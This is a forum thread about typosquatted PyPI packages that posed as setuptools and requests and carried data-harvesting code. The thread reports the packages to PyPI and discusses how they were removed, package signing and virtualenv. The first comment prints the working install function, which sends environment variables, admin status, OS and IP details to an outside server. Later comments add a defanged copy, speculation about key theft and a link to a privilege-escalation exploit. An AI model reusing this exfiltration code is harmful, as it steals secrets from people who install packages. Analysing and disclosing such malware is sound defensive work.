@@ -1,0 +1,160 @@
+This one looks odd, doesn't it?
+
+*Edit: I've just been notified that setuptool as well as rquests and reqests (same thing) have been removed*
+
+Yep. It's sending your IP and environment as well as if you're an admin or not to a server.
+
+I will report it to the PyPI security team
+
+    def install(name):
+        installed_package = name
+        installed_at = datetime.datetime.utcnow()
+        host_os = platform.platform()
+        try:
+            admin_rights = bool(os.getuid() == 0)
+        except AttributeError:
+            try:
+                admin_rights = bool(ctypes.windll.shell32.IsUserAnAdmin() != 0)
+            except:
+                admin_rights = False
+            
+        environ = os.environ
+
+        if sys.version_info[0] == 3:
+            import urllib.request
+            from urllib.parse import urlencode
+            GET = urllib.request.urlopen
+        else:
+            import urllib2
+            from urllib import urlencode
+            GET = urllib2.urlopen
+            
+        ipinfo = GET('http://ipinfo.io/json').read()
+            
+        try:
+            data = {
+                'ip': installed_package,
+                'ia': installed_at,
+                'ho': host_os,
+                'ar': admin_rights,
+                'env': environ,
+                'ii': ipinfo
+            }
+            data = urlencode(data)
+            r = GET('https://zzz.scrapeulous.com/r?', data.encode('utf8')).read()
+        except Exception as e:
+            pass
+
+EDIT: Judging from the fact that the script also send the "installed_package" name to the server, there might be more flying around
+
+Looks like same user has uploaded couple more other misspelled packages https://warehouse.python.org/user/vacation/
+
+Edit: All of those mispelled packages are now taken down by PyPi team (see first comment)
+
+They were: 
+1. setuptool
+2. requsts
+3. reqests
+
+with fake author name as Kenneth Reitz, and contained above malicious code. 
+
+Wow.  The one and only purpose of this "package" is to scrape details from anybody careless enough to "install" it.  I guess we should say we're lucky it doesn't seem to have a payload.
+
+So is any care taken to curate what's on pypi.python.org?  How did that get there?
+This is why I could really care less that pip is using https by default and giving warnings about http sources (I had to adjust the config to use devpi server in the office).  What is really needed is a "state of the archive" file listing the packages, sizes, and shaNsums.  That file should be signed by the pypi webmaster.  There is absolutely no need to use https outside of obtaining the public key.  Debian already does this pretty well and has no need to host repositories over https.
+
+EDIT:  I wasn't thinking completely, but in the case of pypi, there needs to be signatures of the uploaded packages from the authors.  It could also help to have signatures of popular packages from the people who use them regularly, so the trust of a particular package could be more easily measured.  Restricting the archive isn't the best idea, but mitigating these problems would be helpful.
+This is the exact reason why I always rail against doing `sudo pip install`.
+
+PyPI is not a curated library. The only thing barring submission to it is wrapping your head around `setuptools` (the actual library, not this imposter).
+I've notified tucows, the registrar through which the domain was registered, about the offending domain.
+    import urllib.request
+    from urllib.parse import urlencode
+    GET = urllib.request.urlopen
+    import datetime
+    import random
+        
+    data = {
+        'ip': "setuptool",
+        'ia': datetime.datetime(2015,1,random.randint(1,30)),
+        'ho': "Linux-3.1.6-1-ARCH-x86_64",
+        'ar': True,
+        'env': {"SHELL": "/usr/bin/emacs"},
+        'ii': "127.0.0.1",
+    }
+    data = urlencode(data)
+    print(data)
+    #    r = GET('https://zzz.scrapeulous.com/r?', data.encode('utf8')).read()
+
+hey guys am I funny?
+
+Edit: just ran it... It gives a 404.
+Thanks for reporting it to PyPi team. Glad that they were quick to respond.
+
+Thanks for the link, didn't think of that. They've now removed all of those packages (they missed reqests initially)
+No, anyone can upload anything.
+PyPI does have GPG signing of uploaded packages if authors choose to use it - [here's](https://pypi.python.org/pypi/astsearch) one of my packages with a GPG signature. But almost nobody uses it, and even for the few of us who do: so what? I haven't gone to keysigning parties or anything, so you shouldn't trust my signature.
+
+PyPI actually has a reasonable system for well known packages, so long as you spell the name right. Anyone can register a package, but once you've registered, only you or someone you approve can upload that package. Where it falls down is new packages and misspellings - and that's hard to fix without introducing manual checks on new packages, which would be a major bottleneck.
+
+AIUI, the GPG model works for Debian because there is a set of trusted keys baked into the base install. Python could do something similar for PyPI, but piggybacking on the HTTPS root certificates is so much easier - albeit not as secure, as Superfish has just reminded us. And switching to GPG doesn't automatically get you trust of the packages - Debian achieves that by manually checking each uploaded package before upload (in theory, at least; in practice, I'm not sure how much checking it gets).
+The packages weren't clobbering existing trusted packages. They were new packages with spelling similar to existing trusted packages. The malicious packages could be signed by the author just as well, and no automated system would pick up on it, unless you also had some sort of a web-of-trust in place. 
+And that's what `virtualenv` is for.
+[deleted]
+It took me 2 minutes in total:
+
+* Clicking on the "PyPI Security" link
+* Writing an email to those mentioned
+
+If you ever find a security issue, don't be shy and contact those running the site. They don't bite are most likely will be grateful for the information :)
+> https://zzz.scrapeulous.com/ now says, maybe it always did?
+
+No, it didn't when i visited it just one hour ago. No content whatsoever. The author modified it after this thread was started.
+
+Also, that package is now removed from pypi.
+
+Some sort of "social experiment", I'm sure.
+The author does have [one package on pypi](https://pypi.python.org/pypi/GoogleScraper/0.1.36) uploaded under his real name. I don't think it's malicious, but I haven't looked too closely.
+Okay ... backs away slowly.
+It wouldn't stop the script from uploading your private keys to the server, if they are in memory (probably not an easy task, but definitely not impossible).  If that's too difficult, it could always upload the private key files, hoping for an unencrypted set.  If you get enough targets, the likelihood of trapping a lazy admin like me increases.
+
+There is also the consideration of disruption and destruction, the ability to possibly access other hosts on the local network, etc.  If you can do it by typing commands, so can the script.
+
+EDIT:  this makes me feel better
+"Since the 12 of Augoust 2002, setgid(2) and setegid(2) calls have been added
+to the ssh-agent source code in order to prevent the process memory to be
+read by any non-root user:
+
+URL:http://www.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.99&r2=1.98&f=h
+"
+from: http://c0decstuff.blogspot.com/2011/01/in-memory-extraction-of-ssl-private.html
+
+But then again, with enough targets, there may be a host that has this vulnerability:
+https://github.com/realtalk/cve-2013-2094
+
+
+[removed]
+Hotbot ftw
+
+edit: [woah, its still around!](http://www.hotbot.com/)
+[whois on the doman](http://reports.internic.net/cgi/whois?whois_nic=scrapeulous.com&type=domain)
+my domain with hover comes up as twocows
+Tucows runs [Hover](https://hover.com) & [Ting](https://ting.com/)
+Yea, and that's actually who is behind ting mobile.  In case you care
+The package seems to be removed by PyPi team. See edit on first comment.
+It's not like the Apple app store where there's some manual examination process of every package before it shows up on the site; instead, anybody can upload stuff and if there's a problem it can be reported and taken down.
+
+I believe there are some package names that are reserved to avoid problems with malicious imitators/exploiters, but it might be time for typos of important packages to go that way too.
+Even if ssh keys in memory are now safe, it still has access to all the files you do. There are plenty of malicious possibilities with a bit of imagination.
+I was referring the the parent post's saying that `sudo pip install` should be avoided, and indeed virtualenv is usually the best way to do that.
+
+Of course that doesn't guarantee 100% security, but most people running `pip install` aren't sysadmins or something of the sort. They're just trying to install a Python library or utility, and they should be told to use virtualenv instead of resorting to `sudo pip install`.
+I rely on virtualenv for many things, among which is not installing and running 3rd party code as root.
+> Lycos is one of the original and most widely known Internet brands in the world
+
+Source: http://corp.lycos.com
+
+That is not true.
+Man, Lycos is a name I haven't heard in over a decade. They're still around?
+I guess running a search engine is pretty cheap?
+Pretty sure none of these smaller search engines actually keep their own indexes anymore. It was practical back in the olden days, but not anymore. Now they just piggyback off one of the big few that actually have the resources to do so (Google, Bing...) so yeah in that sense it's not too hard to run a search engine.
